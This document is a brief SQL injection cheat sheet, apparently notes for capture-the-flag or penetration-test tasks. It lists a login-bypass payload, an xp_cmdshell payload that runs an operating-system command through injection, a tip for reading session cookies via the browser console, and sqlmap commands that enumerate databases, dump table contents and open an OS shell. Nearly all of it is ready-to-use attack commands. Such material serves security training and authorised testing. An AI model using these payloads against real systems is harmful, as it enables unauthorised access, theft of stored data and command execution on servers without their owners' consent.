# SQL Injection

For SQL injection focused task either perform the injection manually or use sqlmap tool. Check fields using single quote or encoded single quote.

```blah' or 1=1 --``` - Basic login bypass payload. Adjust for specific case.

```blah';exec master..xp_cmdshell 'ping [URL] -l 65000 -t'; --``` - Example command to pop shell through sql injection.

### sqlmap

```sudo sqlmap -u “[URL]” --cookie="[cookie_value]" --dbs``` - Initial command to enumerate databases (--dbs). Add cookie values if necessary (--cookie).

To get the cookie for this login -> inspect element -> console -> type ```document.cookie```

```sudo sqlmap -u “[URL]” -D [database_name] --tables``` - Enumerate tables in the specified database (--tables).

```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).

```sudo sqlmap -u “[URL]” -D [database_name] -T [table_name] --dump``` - Dump all data from table (--dump).

```sudo sqlmap -u “[URL]” --os-shell``` - Pop shell through sqlmap (--os-shell).

```sudo sqlmap -r [filename] --batch -v 5 | tee [output]``` - Use sqlmap with request from file (-r), for example, captured by Burp. This command also uses standard behaviour (--batch) and saves the output to a file (| tee)
